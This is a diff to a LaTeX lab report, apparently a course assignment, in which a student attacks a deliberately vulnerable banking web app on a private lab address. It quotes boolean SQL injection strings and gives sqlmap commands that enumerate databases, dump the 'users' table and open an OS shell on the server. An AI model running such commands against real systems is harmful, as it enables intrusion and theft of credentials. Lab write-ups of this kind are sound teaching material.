@@ -121,6 +121,51 @@
 	The scan results a several alerts, which can be found on the bottom left corner. The high risk alert is the sql injection. The page results were successfully manipulated using the boolean conditions [ZAP' AND '1'='1' - - ] and [ZAP' AND '1'='2' - - ].\\
 	Besides sql injection, there are other vulnerabilities at medium risk. The OWASP ZAP has alerted for 9 different vunerabilites.\\
 	
-	\paragraph*{3.}{\bf Now you have collected enough information about the victim web application and found multiple serious SQL injection vulnerabilities.
+	\paragraph*{3.}{\bf Now you have collected enough information about the victim web application and found multiple serious SQL injection vulnerabilities.\\
 	Use an automatic exploitation tools (e.g. sqlmap) to dump all the database, upload a web shell and prove that you have control of the bank server!}\\\\
+
+	Since we have identified significant vulnerabilities in vBank, which can be exploited with sql injections, we will use 'sqlmap' to exploit.\\
+	To download sqlmap: \\
+	{\sf wget from http://sqlmap.sourceforge.net/\#download}
+	\\To install:\\
+	{\sf tar zxvf sqlmap-1.1.4tar.gz\\
+	cd sqlmap\\}
+	To run: \\
+	{\sf python sqlmap.py} or simply {\sf sqlmap}\\
+	\\ We know the vulnerable fields are 'username' and 'password' of login page. We will run sqlmap to the target webapp using the login page and vulnerable fields as follows:\\
+	\begin{figure}[H]
+		\includegraphics[width=0.75\textheight]{images/sqlmap1.jpg}
+		\caption{Identifying server.}
+	\end{figure}
+	Sqlmap identifies the server using 'Linux' operating system, 'Apache' webserver and 'MySQL' DBMS. Next we find out the database name using '-{}- dbs' option.\\
+	Command used:\\ {\sf sqlmap -u "http://192.168.0.29/vBank/htdocs/login.php?username=\&password=" -{}-dbs}\\
+	\begin{figure}[H]
+		\includegraphics[width=0.75\textheight]{images/sqlmap2.jpg}
+		\caption{Identifying database name.}
+	\end{figure}
+	
+	There are 6 databases found. Our target database is 'vbank'.\\
+	Using {\sf '-D vbank -{}-tables'} option, we can enumerate the tables of vbank.\\
+	command:\\
+	{\sf sqlmap -u "http://192.168.0.29/vBank/htdocs/login.php?username=\&password=" -D vbank -{}-tables
+	}
+	\begin{figure}[H]
+		\includegraphics[width=0.75\textheight]{images/sqlmap3.jpg}
+		\caption{Enumerating tables.}
+	\end{figure}
+	
+	To display the contents of a table, we can use -{}-dump option. Here the 'users' table is the table of interest. We use following command to display it.\\
+	command:\\
+	{\sf sqlmap -u "http://192.168.0.29/vBank/htdocs/login.php?username=\&password=" -D vbank -T users -{}-dump
+	}
+	\begin{figure}[H]
+		\includegraphics[width=0.75\textheight]{images/sqlmap4.jpg}
+		\caption{contents of 'users' table.}
+	\end{figure}
+	
+	Sqlmap has it own shell. To upload a shell, we use {\sf -{}-os-shell} option.\\
+	command:\\
+	{\sf sqlmap -u "http://192.168.0.29/vBank/htdocs/login.php?username=\&password=" -{}-os-shell
+	}
+	
 \end{document}
